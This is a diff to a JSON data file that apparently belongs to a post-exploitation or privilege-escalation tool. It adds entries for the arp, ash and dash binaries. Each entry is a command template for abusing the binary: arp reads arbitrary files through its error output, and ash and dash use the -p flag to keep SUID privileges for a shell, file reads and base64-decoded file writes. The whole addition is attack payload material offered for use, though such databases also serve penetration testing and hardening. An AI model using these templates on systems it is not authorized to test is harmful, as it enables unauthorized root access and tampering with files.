@@ -38,5 +38,36 @@
 	{
 		"name": "cat",
 		"read_file": "{path} {lfile}"
+	},
+	{
+		"name": "arp",
+		"read_file": "{path} -v -f {lfile} 2>&1 | while read line; do substring=\"\"; if ! test \"${{line#*arp}}\" != \"$line\"; then echo ${{line#>> }}; fi; done",
+		"safe":false
+	},
+	{
+		"name": "ash",
+		"shell": {
+			"script": "{command}", 
+			"suid": ["-p"]
+		},
+		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+		},
+		"command": "{path} -p -c {command}"
+	},
+	{
+		"name": "dash",
+		"shell": {
+			"script": "{command}", 
+			"suid": ["-p"]
+		},
+		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+		},
+		"command": "{path} -p -c {command}"
 	}
 ]
